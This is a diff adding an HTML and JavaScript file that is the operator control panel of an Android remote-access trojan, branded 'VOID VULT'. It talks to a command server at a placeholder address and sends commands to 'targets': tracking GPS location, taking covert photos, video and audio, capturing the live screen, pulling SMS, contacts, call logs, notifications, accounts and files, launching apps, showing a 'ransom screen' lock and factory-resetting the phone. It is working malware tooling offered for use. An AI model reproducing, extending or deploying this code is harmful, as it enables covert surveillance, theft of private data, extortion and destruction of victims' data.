@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>VOID VULT</title>
+<style>
+  :root{
+    --bg:#070b14;
+    --card:#0f1729;
+    --card-2:#141f38;
+    --border:#1e2c4d;
+    --accent:#7b5cff;
+    --accent-2:#22d3ee;
+    --danger:#ff3355;
+    --success:#00e676;
+    --text:#eef2fa;
+    --text-2:#8894b5;
+    --text-3:#4d5a7a;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;min-height:100vh;}
+  body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:100px;}
+
+  .header{width:100%;max-width:520px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:18px;box-shadow:0 8px 30px rgba(0,0,0,.4);}
+  .logo{font-size:20px;letter-spacing:.12em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 30px rgba(123,92,255,.5);}
+  .logo small{display:block;font-size:8px;letter-spacing:.32em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
+  .logout{font-size:10px;color:var(--text-2);letter-spacing:.15em;background:var(--card);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;}
+  .logout:active{background:var(--card-2);}
+
+  .screen{width:100%;max-width:520px;display:none;}
+  .screen.active{display:block;animation:fade .3s ease;}
+  @keyframes fade{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+
+  .login-wrap{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:38px 24px;margin-top:30px;box-shadow:0 20px 60px rgba(0,0,0,.5);}
+  .login-title{text-align:center;font-size:32px;letter-spacing:.12em;font-weight:900;color:#fff;margin-bottom:4px;background:linear-gradient(90deg,#fff,#9bb0ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+  .login-sub{text-align:center;font-size:10px;letter-spacing:.4em;color:var(--text-3);margin-bottom:34px;}
+  .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#fff;font-size:14px;letter-spacing:.1em;margin-bottom:12px;text-align:center;outline:none;}
+  .field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15);}
+  .field::placeholder{color:var(--text-3);letter-spacing:.18em;}
+  .btn-main{width:100%;padding:18px;border:none;border-radius:14px;font-weight:900;letter-spacing:.22em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));cursor:pointer;box-shadow:0 10px 30px rgba(123,92,255,.4);}
+  .btn-main:active{transform:scale(.98);}
+
+  .page-title{font-size:24px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
+  .page-sub{font-size:11px;color:var(--text-3);letter-spacing:.25em;margin-bottom:20px;}
+
+  .device-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .device-card:active{background:var(--card-2);transform:scale(.99);border-color:var(--accent);}
+  .device-card .info{flex:1;}
+  .device-card .dev-id{font-size:18px;font-weight:900;letter-spacing:.1em;color:#fff;}
+  .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;}
+  .device-card .status{font-size:9px;font-weight:800;letter-spacing:.18em;padding:7px 13px;border-radius:20px;}
+  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);}
+  .device-card .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
+
+  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;letter-spacing:.15em;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;}
+  .back-btn:active{background:var(--card-2);}
+  .detail-title{font-size:24px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
+  .detail-sub{font-size:11px;color:var(--text-2);letter-spacing:.08em;margin-bottom:20px;}
+
+  .section-label{font-size:11px;font-weight:800;letter-spacing:.3em;color:var(--text-3);margin:26px 0 12px;display:flex;align-items:center;gap:10px;}
+  .section-label::before{content:'';width:3px;height:14px;background:linear-gradient(180deg,var(--accent),var(--accent-2));border-radius:2px;box-shadow:0 0 10px var(--accent);}
+
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:8px;}
+  .ctrl{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:14px 10px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.2s;gap:6px;position:relative;overflow:hidden;}
+  .ctrl:active{transform:scale(.97);border-color:var(--accent);box-shadow:0 0 20px rgba(123,92,255,.4);}
+  .ctrl .icon{font-size:24px;filter:drop-shadow(0 0 10px rgba(123,92,255,.5));}
+  .ctrl .label{font-size:11px;font-weight:800;letter-spacing:.12em;color:var(--text);}
+  .ctrl .desc{font-size:9px;color:var(--text-3);letter-spacing:.03em;line-height:1.3;margin-top:2px;}
+  .ctrl.active{background:linear-gradient(180deg,rgba(0,230,118,.15),rgba(0,230,118,.05));border-color:var(--success);box-shadow:0 0 20px rgba(0,230,118,.3);}
+  .ctrl.active .label{color:var(--success);}
+  .ctrl.danger{border-color:rgba(255,51,85,.3);}
+  .ctrl.danger:active{background:rgba(255,51,85,.1);box-shadow:0 0 20px rgba(255,51,85,.4);}
+
+  .output{background:#04070f;border:1px solid var(--border);border-radius:16px;padding:18px;font-size:14px;color:#b7c9ff;font-family:'Menlo','Courier New',monospace;line-height:1.7;max-height:60vh;min-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;box-shadow:inset 0 0 40px rgba(123,92,255,.08);}
+  .output .empty{color:var(--text-3);text-align:center;padding:50px 0;letter-spacing:.2em;font-size:12px;}
+  .output img{max-width:100%;border-radius:10px;border:1px solid var(--border);margin-top:8px;box-shadow:0 6px 20px rgba(0,0,0,.5);}
+
+  .app-row{display:flex;justify-content:space-between;align-items:center;background:#0f1a33;border:1px solid #1d2f56;border-radius:10px;padding:10px 14px;margin-bottom:6px;cursor:pointer;}
+  .app-row:active{background:#152442;border-color:var(--accent);}
+  .app-row .app-name{color:#e5edf9;font-size:13px;font-weight:600;flex:1;}
+  .app-row .app-open{color:var(--accent-2);font-size:10px;font-weight:800;letter-spacing:.15em;}
+
+  .bottom-nav{width:100%;max-width:520px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:rgba(15,23,41,.92);backdrop-filter:blur(24px);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:14px 0;z-index:10;}
+  .nav-item{background:none;border:none;color:var(--text-3);font-size:9px;font-weight:800;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:5px;padding:6px 18px;cursor:pointer;}
+  .nav-item.active{color:var(--accent-2);}
+  .nav-item .ic{font-size:20px;}
+
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--card-2),var(--card));border:1px solid var(--accent);color:#fff;padding:14px 24px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;pointer-events:none;z-index:100;box-shadow:0 10px 40px rgba(123,92,255,.4);}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+
+  .loading{text-align:center;padding:40px 0;color:var(--text-3);font-size:11px;letter-spacing:.25em;}
+
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
+  .modal.show{display:flex;}
+  .modal img{max-width:100%;max-height:90vh;border-radius:14px;border:1px solid var(--accent);}
+  .modal-close{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;font-size:12px;letter-spacing:.12em;cursor:pointer;}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">VOID VULT<small>CONTROL PANEL</small></div>
+  <button class="logout" id="logoutBtn" style="display:none;">LOGOUT</button>
+</div>
+
+<div class="screen active" id="screenLogin">
+  <div class="login-wrap">
+    <div class="login-title">VOID VULT</div>
+    <div class="login-sub">ACCESS YOUR VAULT</div>
+    <input class="field" id="loginUser" placeholder="USERNAME" autocomplete="off">
+    <input class="field" id="loginPass" placeholder="USER ID" type="number" autocomplete="off">
+    <button class="btn-main" id="loginBtn">ENTER VAULT</button>
+  </div>
+</div>
+
+<div class="screen" id="screenList">
+  <div class="page-title">DEVICES</div>
+  <div class="page-sub">YOUR CONNECTED TARGETS</div>
+  <div id="deviceListContainer"><div class="loading">LOADING</div></div>
+</div>
+
+<div class="screen" id="screenDetail">
+  <button class="back-btn" id="backBtn">&lt; BACK</button>
+  <div class="detail-title" id="detailTitle">—</div>
+  <div class="detail-sub" id="detailSub">—</div>
+
+  <div class="section-label">REMOTE CONTROL</div>
+  <div class="grid">
+    <div class="ctrl" data-cmd="location_sync" data-id="btn-loc">
+      <div class="icon">📍</div>
+      <div class="label">LOCATION</div>
+      <div class="desc">Get GPS & map link</div>
+    </div>
+    <div class="ctrl" data-cmd="photo_capture" data-id="btn-cam">
+      <div class="icon">📸</div>
+      <div class="label">BACK CAM</div>
+      <div class="desc">Rear photo</div>
+    </div>
+    <div class="ctrl" data-cmd="self_photo" data-id="btn-selfie">
+      <div class="icon">🤳</div>
+      <div class="label">SELFIE</div>
+      <div class="desc">Front photo</div>
+    </div>
+    <div class="ctrl" data-cmd="clip_record" data-arg="10" data-id="btn-video">
+      <div class="icon">🎥</div>
+      <div class="label">VIDEO</div>
+      <div class="desc">10s rear recording</div>
+    </div>
+    <div class="ctrl" data-cmd="voice_record" data-arg="15" data-id="btn-audio">
+      <div class="icon">🎤</div>
+      <div class="label">AUDIO</div>
+      <div class="desc">15s mic recording</div>
+    </div>
+    <div class="ctrl" data-cmd="display_read" data-id="btn-screen">
+      <div class="icon">📱</div>
+      <div class="label">SCREENSHOT</div>
+      <div class="desc">Capture current screen</div>
+    </div>
+    <div class="ctrl" data-cmd="display_stream" data-id="btn-live">
+      <div class="icon">🔴</div>
+      <div class="label">LIVE SCREEN</div>
+      <div class="desc">Continuous screenshots</div>
+    </div>
+    <div class="ctrl" data-cmd="led_test" data-id="btn-flash">
+      <div class="icon">⚡</div>
+      <div class="label">FLASH SPAM</div>
+      <div class="desc">Blink LED on/off</div>
+    </div>
+    <div class="ctrl" data-cmd="message_sync" data-id="btn-sms">
+      <div class="icon">💬</div>
+      <div class="label">SMS</div>
+      <div class="desc">Last 50 inbox messages</div>
+    </div>
+    <div class="ctrl" data-cmd="alert_sync" data-id="btn-notif">
+      <div class="icon">🔔</div>
+      <div class="label">NOTIFICATIONS</div>
+      <div class="desc">Recent notifications</div>
+    </div>
+    <div class="ctrl" data-cmd="contact_sync" data-id="btn-contacts">
+      <div class="icon">👤</div>
+      <div class="label">CONTACTS</div>
+      <div class="desc">Full contact list</div>
+    </div>
+    <div class="ctrl" data-cmd="call_sync" data-id="btn-calls">
+      <div class="icon">📞</div>
+      <div class="label">CALL LOG</div>
+      <div class="desc">Last 50 calls</div>
+    </div>
+    <div class="ctrl" data-cmd="account_sync" data-id="btn-accounts">
+      <div class="icon">👥</div>
+      <div class="label">ACCOUNTS</div>
+      <div class="desc">Google, WhatsApp, etc.</div>
+    </div>
+    <div class="ctrl" data-cmd="app_list" data-id="btn-apps">
+      <div class="icon">📦</div>
+      <div class="label">APPS</div>
+      <div class="desc">Installed apps (tap to open)</div>
+    </div>
+    <div class="ctrl" data-cmd="folder_read" data-arg="/sdcard" data-id="btn-files">
+      <div class="icon">📁</div>
+      <div class="label">FILES</div>
+      <div class="desc">Browse /sdcard</div>
+    </div>
+    <div class="ctrl" data-cmd="notice_send" data-id="btn-toast">
+      <div class="icon">💭</div>
+      <div class="label">TOAST</div>
+      <div class="desc">Show popup on target</div>
+    </div>
+    <div class="ctrl danger" data-cmd="session_pause" data-id="btn-lock">
+      <div class="icon">🔒</div>
+      <div class="label">LOCK</div>
+      <div class="desc">Show ransom screen</div>
+    </div>
+    <div class="ctrl danger" data-cmd="factory_reset" data-id="btn-wipe">
+      <div class="icon">⚠️</div>
+      <div class="label">WIPE</div>
+      <div class="desc">Factory reset target</div>
+    </div>
+  </div>
+
+  <div class="section-label">LIVE OUTPUT</div>
+  <div class="output" id="outputBox"><div class="empty">WAITING FOR COMMAND</div></div>
+</div>
+
+<div class="bottom-nav" id="bottomNav" style="display:none;">
+  <button class="nav-item active" data-screen="screenList"><span class="ic">◉</span>DEVICES</button>
+  <button class="nav-item" data-screen="screenDetail"><span class="ic">⚙</span>CONTROL</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<div class="modal" id="imgModal">
+  <button class="modal-close" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button>
+  <img id="imgModalImg" src="">
+</div>
+
+<script>
+// ============================================================
+//   SET YOUR SERVER URL HERE
+// ============================================================
+const SERVER = "http://YOUR-RAW-IP:3000";
+
+let state = {
+  token:null,
+  userId:null,
+  currentDevice:null,
+  pollTimer:null,
+  liveOn:false,
+  flashOn:false,
+  lastResultId:0,
+  activeCommand: null
+};
+
+function $(id){return document.getElementById(id);}
+function showToast(msg){const t=$('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2200);}
+function showScreen(id){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));$(id).classList.add('active');window.scrollTo(0,0);}
+function esc(s){return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+
+// ---------- LOGIN ----------
+$('loginBtn').addEventListener('click', async ()=>{
+  const u = $('loginUser').value.trim();
+  const p = $('loginPass').value.trim();
+  if(!u || !p){ showToast('Enter username and user ID'); return; }
+  try{
+    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u, password:p})});
+    const j = await r.json();
+    if(!j.ok){ showToast('Invalid credentials'); return; }
+    state.token = j.token;
+    state.userId = j.userId;
+    $('logoutBtn').style.display = 'block';
+    $('bottomNav').style.display = 'flex';
+    showToast('Access granted');
+    showScreen('screenList');
+    loadDevices();
+  }catch(e){ showToast('Server unreachable'); }
+});
+
+$('logoutBtn').addEventListener('click', ()=>{
+  state.token = null; state.userId = null; state.currentDevice = null;
+  state.liveOn = false; state.flashOn = false; state.lastResultId = 0;
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  $('logoutBtn').style.display = 'none';
+  $('bottomNav').style.display = 'none';
+  showScreen('screenLogin');
+});
+
+// ---------- DEVICE LIST (filtered by user) ----------
+async function loadDevices(){
+  const c = $('deviceListContainer');
+  c.innerHTML = '<div class="loading">LOADING</div>';
+  try{
+    const r = await fetch(SERVER+'/clients?wallet='+encodeURIComponent(state.userId));
+    const j = await r.json();
+    const list = j.clients || j.devices || [];
+    if(!j.ok || !list.length){
+      c.innerHTML = '<div class="loading">NO DEVICE CONNECTED YET</div>';
+      return;
+    }
+    c.innerHTML = '';
+    list.forEach(d=>{
+      const el = document.createElement('div');
+      el.className = 'device-card';
+      el.innerHTML = `
+        <div class="info">
+          <div class="dev-id">${esc(d.userId)}</div>
+          <div class="dev-model">${esc(d.device||'?')} • ${esc(d.android||'?')}</div>
+        </div>
+        <div class="status ${d.online?'online':'offline'}">${d.online?'ONLINE':'OFFLINE'}</div>
+      `;
+      el.addEventListener('click', ()=>openDevice(d.userId));
+      c.appendChild(el);
+    });
+  }catch(e){ c.innerHTML = '<div class="loading">SERVER ERROR</div>'; }
+}
+
+// ---------- DEVICE DETAIL ----------
+async function openDevice(userId){
+  state.currentDevice = userId;
+  state.liveOn = false;
+  state.flashOn = false;
+  state.lastResultId = 0;
+  state.activeCommand = null;
+  $('detailTitle').textContent = userId;
+  $('detailSub').textContent = 'LOADING INFO';
+  $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
+  document.querySelectorAll('.ctrl').forEach(c=>c.classList.remove('active'));
+  showScreen('screenDetail');
+  try{
+    const r = await fetch(SERVER+'/client?id='+encodeURIComponent(userId));
+    const j = await r.json();
+    if(j.ok){
+      const online = j.online ? 'ONLINE' : 'OFFLINE';
+      $('detailSub').textContent = (j.device||'?') + ' • ' + (j.android||'?') + ' • ' + online;
+      state.liveOn = !!j.live;
+      state.flashOn = !!j.flash;
+      if(state.liveOn) document.querySelector('[data-id="btn-live"]').classList.add('active');
+      if(state.flashOn) document.querySelector('[data-id="btn-flash"]').classList.add('active');
+    }
+  }catch(e){}
+  startResultPoll();
+}
+
+$('backBtn').addEventListener('click', ()=>{
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = null;
+  showScreen('screenList');
+  loadDevices();
+});
+
+// ---------- SEND COMMAND ----------
+document.querySelectorAll('.ctrl').forEach(el=>{
+  el.addEventListener('click', async ()=>{
+    if(!state.currentDevice){ showToast('No device selected'); return; }
+    const cmd = el.dataset.cmd;
+    let arg = el.dataset.arg || '';
+
+    if(cmd === 'factory_reset'){ if(!confirm('WIPE THE TARGET DEVICE? Cannot be undone.')) return; }
+    if(cmd === 'notice_send'){ const t = prompt('Toast message:', 'Hello'); if(t === null) return; arg = t; }
+    if(cmd === 'folder_read'){ const p = prompt('Folder path:', '/sdcard'); if(p === null) return; arg = p; }
+    if(cmd === 'clip_record'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
+    if(cmd === 'voice_record'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
+
+    if(cmd === 'led_test'){
+      state.flashOn = !state.flashOn;
+      if(state.flashOn){ el.classList.add('active'); arg = 'on'; showToast('FLASH ON'); }
+      else { el.classList.remove('active'); arg = 'off'; showToast('FLASH OFF'); }
+    }
+    if(cmd === 'display_stream'){
+      state.liveOn = !state.liveOn;
+      if(state.liveOn){ el.classList.add('active'); arg = 'on'; showToast('LIVE ON'); }
+      else { el.classList.remove('active'); arg = 'off'; showToast('LIVE OFF'); }
+    }
+
+    if(cmd !== 'led_test' && cmd !== 'display_stream'){
+      state.activeCommand = cmd;
+      state.lastResultId = 0;
+      $('outputBox').innerHTML = '<div class="empty">EXECUTING ' + cmd.toUpperCase() + '...</div>';
+    }
+
+    try{
+      const r = await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})});
+      const j = await r.json();
+      if(j.ok && cmd !== 'led_test' && cmd !== 'display_stream') showToast('Sent: '+cmd);
+      else if(!j.ok) showToast('Send failed');
+    }catch(e){ showToast('Server error'); }
+  });
+});
+
+// ---------- POLL RESULTS ----------
+function startResultPoll(){
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = setInterval(async ()=>{
+    if(!state.currentDevice) return;
+    try{
+      const r = await fetch(SERVER+'/client?id='+encodeURIComponent(state.currentDevice));
+      const j = await r.json();
+      if(!j.ok) return;
+
+      state.liveOn = !!j.live;
+      state.flashOn = !!j.flash;
+      const liveBtn = document.querySelector('[data-id="btn-live"]');
+      const flashBtn = document.querySelector('[data-id="btn-flash"]');
+      if(liveBtn){ if(state.liveOn) liveBtn.classList.add('active'); else liveBtn.classList.remove('active'); }
+      if(flashBtn){ if(state.flashOn) flashBtn.classList.add('active'); else flashBtn.classList.remove('active'); }
+
+      if(j.results && j.results.length){
+        const box = $('outputBox');
+        if(box.querySelector('.empty')) box.innerHTML = '';
+
+        j.results.forEach(res=>{
+          if(res.at <= state.lastResultId) return;
+          if(state.activeCommand && res.cmd !== state.activeCommand &&
+             !(state.activeCommand === 'display_read' && res.cmd === 'mp_screen') &&
+             !(state.activeCommand === 'display_stream' && res.cmd === 'mp_live')) return;
+          state.lastResultId = res.at;
+
+          const line = document.createElement('div');
+          line.style.marginBottom = '14px';
+          line.style.paddingBottom = '12px';
+          line.style.borderBottom = '1px solid #1a2440';
+
+          if(res.cmd === 'app_list' && res.data){
+            let html = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;margin-bottom:10px;">&gt; INSTALLED APPS</div>';
+            const lines = res.data.split('\n');
+            let count = 0;
+            lines.forEach(l => {
+              if(l.indexOf(' | ') > -1){
+                const parts = l.split(' | ');
+                const name = parts[0].trim();
+                const pkg = parts[1] ? parts[1].trim() : '';
+                if(pkg){
+                  html += '<div class="app-row" data-pkg="' + esc(pkg) + '">'
+                    + '<div class="app-name">' + esc(name) + '</div>'
+                    + '<div class="app-open">OPEN ▸</div>'
+                    + '</div>';
+                  count++;
+                }
+              }
+            });
+            html += '<div style="color:#4d5a7a;font-size:10px;margin-top:8px;">' + count + ' apps • ' + new Date(res.at).toLocaleTimeString() + '</div>';
+            line.innerHTML = html;
+          }
+          else if(j.uploads && j.uploads.length){
+            const matchUpload = j.uploads.find(u => {
+              return (u.type && res.cmd && u.type.toLowerCase().indexOf(res.cmd) === 0) ||
+                     (res.cmd === 'display_read' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'mp_screen' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'mp_live' && u.type && u.type.toLowerCase() === 'live');
+            });
+            if(matchUpload){
+              const url = matchUpload.url || (SERVER + '/media/' + encodeURIComponent(matchUpload.name));
+              line.innerHTML =
+                '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+                '<img src="' + url + '" onclick="openImage(\'' + url + '\')" style="cursor:pointer;"/>' +
+                '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            } else {
+              line.innerHTML =
+                '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+                '<div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
+                '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            }
+          }
+          else {
+            line.innerHTML =
+              '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+              '<div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
+              '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+          }
+          box.insertBefore(line, box.firstChild);
+        });
+
+        document.querySelectorAll('.app-row').forEach(row => {
+          row.onclick = async () => {
+            const pkg = row.dataset.pkg;
+            if(!pkg || !state.currentDevice) return;
+            try{
+              await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:'app_launch', args:pkg})});
+              showToast('Opening ' + pkg.split('.').pop());
+            }catch(e){ showToast('Error'); }
+          };
+        });
+      }
+    }catch(e){}
+  }, 2000);
+}
+
+function openImage(url){
+  $('imgModalImg').src = url;
+  $('imgModal').classList.add('show');
+}
+
+document.querySelectorAll('.nav-item').forEach(el=>{
+  el.addEventListener('click', ()=>{
+    document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+    el.classList.add('active');
+    showScreen(el.dataset.screen);
+    if(el.dataset.screen === 'screenList') loadDevices();
+  });
+});
+</script>
+</body>
+</html>
